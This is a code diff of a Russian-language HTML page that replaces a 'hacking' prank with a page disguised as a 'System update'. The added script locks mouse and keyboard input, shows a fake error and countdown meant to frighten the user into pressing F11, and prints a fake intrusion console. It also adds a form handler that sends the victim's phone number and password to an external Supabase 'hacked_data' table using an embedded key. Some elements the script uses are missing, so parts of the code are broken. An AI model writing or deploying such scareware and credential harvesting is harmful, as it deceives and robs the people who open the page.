@@ -1,91 +1,173 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ВЗЛОМ СИСТЕМЫ...</title>
+    <title>Системное обновление</title>
     <style>
+                /* Полностью скрываем курсор */
+        body, html {
+            cursor: none !important;
+        }
+        
+        /* Дополнительно блокируем выделение текста */
         body {
-            background: black;
-            color: lime;
-            font-family: monospace;
-            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        body {
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            font-family: 'Consolas', monospace;
+            background: #000;
+            color: red;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            cursor: none;
         }
-        #matrix {
-            position: fixed;
-            top: 0;
-            left: 0;
-            opacity: 0.1;
-            z-index: -1;
+        #fake-error {
+            font-size: 24px;
+            text-shadow: 0 0 5px red;
         }
-        #hack-text {
+        #hack-console {
+            display: none;
             white-space: pre;
-            line-height: 1.2;
+            line-height: 1.5;
         }
-        .blink {
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
+        .blink { animation: blink 0.7s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <canvas id="matrix"></canvas>
-    <div id="hack-text"></div>
-
+    <!-- Фейковая ошибка -->
+    <div id="fake-error">
+        <p>ОШИБКА ГРАФИЧЕСКОГО ДВИЖКА (Код: 0xFA11)</p>
+        <p>Для продолжения работы нажмите <span class="blink">F11</span></p>
+        <p id="fake-timer">Автоматическое исправление через: 5 сек</p>
+    </div>
+    
+    <!-- Настоящий "взлом" (покажется после F11) -->
+    <div id="hack-console"></div>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <script>
-        // Эффект "Матрицы" на фоне
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
+                // Блокируем ВСЕ события мыши
+        document.addEventListener('mousedown', e => e.preventDefault(), {capture: true});
+        document.addEventListener('mouseup', e => e.preventDefault(), {capture: true});
+        document.addEventListener('click', e => e.preventDefault(), {capture: true});
+        document.addEventListener('dblclick', e => e.preventDefault(), {capture: true});
+        document.addEventListener('contextmenu', e => e.preventDefault(), {capture: true});
+        document.addEventListener('mousemove', e => e.preventDefault(), {capture: true});
         
-        const chars = "01";
-        const fontSize = 14;
-        const columns = Math.floor(canvas.width / fontSize);
-        const drops = Array(columns).fill(0);
-
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#0f0';
-            ctx.font = fontSize + 'px monospace';
-
-            for (let i = 0; i < drops.length; i++) {
-                const text = chars[Math.floor(Math.random() * chars.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
+        // Блокируем колесико мыши
+        document.addEventListener('wheel', e => e.preventDefault(), {passive: false});
+        
+        // Блокируем тачпад (для ноутбуков)
+        document.addEventListener('touchstart', e => e.preventDefault(), {passive: false});
+                // Двойная защита через JavaScript
+        document.body.style.cursor = 'none';
+        
+        // Блокируем правую кнопку мыши (опционально)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        // 1. Блокируем всё, кроме F11
+        document.addEventListener('keydown', (e) => {
+            if (e.key !== 'F11') {
+                // Подменяем любую клавишу на "F11" в подсказке
+                document.getElementById('fake-error').innerHTML = `
+                    <p>НЕВЕРНАЯ КЛАВИША!</p>
+                    <p>Нажмите <span class="blink">F11</span>, иначе система будет перезагружена</p>
+                `;
+                
+                // Запугиваем звуком
+                playErrorSound();
             }
+        });
+        
+        // 2. Фейковый таймер
+        let seconds = 5;
+        const timer = setInterval(() => {
+            document.getElementById('fake-timer').textContent = 
+                `Автоматическое исправление через: ${seconds} сек`;
+            seconds--;
+            
+            if (seconds < 0) {
+                clearInterval(timer);
+                document.getElementById('fake-error').innerHTML = `
+                    <p>СИСТЕМА НЕ ОТВЕЧАЕТ</p>
+                    <p>СРОЧНО НАЖМИТЕ <span class="blink">F11</span></p>
+                `;
+                playErrorSound();
+            }
+        }, 1000);
+        
+        // 3. Когда пользователь нажмёт F11 - запускаем "взлом"
+        document.addEventListener('keyup', (e) => {
+            if (e.key === 'F11') {
+                document.getElementById('fake-error').style.display = 'none';
+                document.getElementById('hack-console').style.display = 'block';
+                startRealHack();
+            }
+        });
+        
+        // 4. Настоящий "взлом" (после F11)
+        async function startRealHack() {
+            const consoleElem = document.getElementById('hack-console');
+            
+            const print = async (text, delay = 50) => {
+                for (let char of text) {
+                    consoleElem.innerHTML += char;
+                    await new Promise(r => setTimeout(r, delay));
+                }
+                consoleElem.innerHTML += '\n';
+            };
+            
+            await print('> ВЗЛОМ ИНИЦИАЛИЗИРОВАН');
+            await print('> Ваш IP: 192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255));
+            await print('> Поиск уязвимостей... УСПЕШНО');
+            await print('> Подключаемся к камере... АКТИВИРОВАНА');
+            await print('> Доступ к паролям... ПОЛУЧЕН');
+            await print('\nВАША СИСТЕМА ВЗЛОМАНА!');
+            await print('Это шутка, но F11 ты уже нажал :)');
+            await print('<span class="blink">Нажми F5 чтобы выйти</span>');
         }
-        setInterval(drawMatrix, 50);
-
-        // Текст "взлома"
-        const hackText = document.getElementById('hack-text');
-        const messages = [
-            "> Подключаемся к системе...",
-            "> Обход защиты... УСПЕШНО",
-            "> Доступ к камере: АКТИВИРОВАН",
-            "> Перехват паролей... 23%... 67%... 100%",
-            "> ВЗЛОМ ЗАВЕРШЕН!",
-            " ",
-            "ТВОЙ КОМПЬЮТЕР ВЗЛОМАН!",
-            "ХА-ХА-ХА! ЭТО РОЗЫГРЫШ! 😆"
-        ];
-
-        let i = 0;
-        function typeWriter() {
-            if (i < messages.length) {
-                hackText.innerHTML += messages[i] + "<br>";
-                i++;
-                setTimeout(typeWriter, 1500);
+                // Инициализация Supabase (замени на свои данные!)
+        const supabaseUrl = 'https://vrzghglpkndfmvpdowqk.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZyemdoZ2xwa25kZm12cGRvd3FrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM4ODI1ODksImV4cCI6MjA2OTQ1ODU4OX0.ZbdPGGBoDK84V1okPLvAbdkyxvugg35DWHGPzYqFWQU';
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+        
+        // Показываем модальное окно через 5 секунд
+        setTimeout(() => {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('modal').style.display = 'block';
+        }, 5000);
+        
+        // Обработка отправки формы
+        document.getElementById('submit').addEventListener('click', async () => {
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            
+            if (!phone || !password) {
+                alert('Заполните все поля!');
+                return;
+            }
+            
+            // Отправляем данные в Supabase
+            const { data, error } = await supabase
+                .from('hacked_data')
+                .insert([{ phone, password }]);
+            
+            if (error) {
+                console.error('Ошибка:', error);
+                alert('Ошибка отправки!');
             } else {
-                hackText.innerHTML += "<span class='blink'>Нажми F5 для перезагрузки</span>";
+                alert('Данные приняты! Система будет разблокирована...');
+                document.getElementById('modal').style.display = 'none';
+                document.getElementById('overlay').style.display = 'none';
             }
-        }
-        setTimeout(typeWriter, 1000);
+        });
     </script>
 </body>
 </html>
